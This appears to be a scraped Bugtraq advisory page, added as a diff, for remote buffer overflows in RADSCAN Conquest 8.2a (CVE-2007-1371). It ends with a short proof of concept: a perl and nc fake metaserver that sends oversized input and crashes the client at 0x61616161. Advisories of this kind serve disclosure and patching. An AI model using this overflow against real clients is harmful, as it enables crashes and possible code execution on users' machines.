@@ -1,0 +1,99 @@
+#SpeeDr00t@Black Falcon<br>#bid22855<p><b><span style="font-size: 18pt;">Radscan Conquest Multiple Remote Vulnerabilities</span></b></p><br><br><a href="http://www.securityfocus.com/bid/22855/info">info</a><br><a href="http://www.securityfocus.com/bid/22855/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/22855/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/22855/solution">solution</a><br><a href="http://www.securityfocus.com/bid/22855/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				22855
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Boundary Condition Error
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+				
+					CVE-2007-1371<br/>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				Mar 07 2007 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				May 12 2015 07:33PM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				Luigi Auriemma is credited with the discovery of these vulnerabilities.
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					RADSCAN Conquest   8.2a<br/>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+				
+					RADSCAN Conquest   8.2b<br/>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>##no_exploit_link<br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	The following proof of concept is available:<br/><br/>1. Launch a fake metaserver that sends more than 1024 chars:<br/>   perl -e 'print "a"x1200' | nc -l -p 1700 -v -v -n<br/><br/>2. Launch the client, specifying the alternate metaserver:<br/>   conquest -m -M 127.0.0.1<br/><br/> 3. Interrupt the fake metaserver: conquest should have been crashed<br/>   trying to executing the code at offset 0x61616161
+	
+		<ul>
+</ul>
+</div>
